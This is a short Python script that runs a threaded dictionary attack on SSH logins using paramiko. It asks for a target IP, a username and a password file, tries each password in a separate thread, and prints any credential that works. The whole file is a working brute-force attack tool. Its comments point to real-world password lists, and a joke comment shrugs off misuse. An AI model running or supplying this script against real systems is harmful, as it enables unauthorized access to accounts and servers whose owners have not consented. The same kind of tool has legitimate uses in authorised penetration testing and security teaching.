import paramiko, sys, os, socket, termcolor
import threading, time

host = input('[+] Target IP Address: ')
username = input('[+] SSH Username: ')
#Identifies list of passwords to try bruteforcing the user ssh with. There are many huge lists of passwords used in IRL dictionary attacks out there.
input_file = input('[+] Passwords file: ')

stop_flag = 0

#Try establishing SSH connection until valid password found
def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(f'[+] Password Successful: {password} for Account: {username}', 'green'))
    except:
        print(termcolor.colored(f'[-] Incorrect Password: {password}', 'red'))
    ssh.close()

#Check if passwords file exists on the computer
if os.path.exists(input_file) == False:
    print(termcolor.colored('[!!] FILE NOT FOUND', 'red'))
    sys.exit(1)

#Execute dictionary attack by trying each password in file ((IN MINECRAFT))
print(f'Starting Threaded SSH Bruteforce on {host} with Account: {username} * * *')
with open(input_file, mode='r') as f:
    for line in f.readlines():
#If stop_flag == 1, that means the correct password has been identified; threads are joined and program exits
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
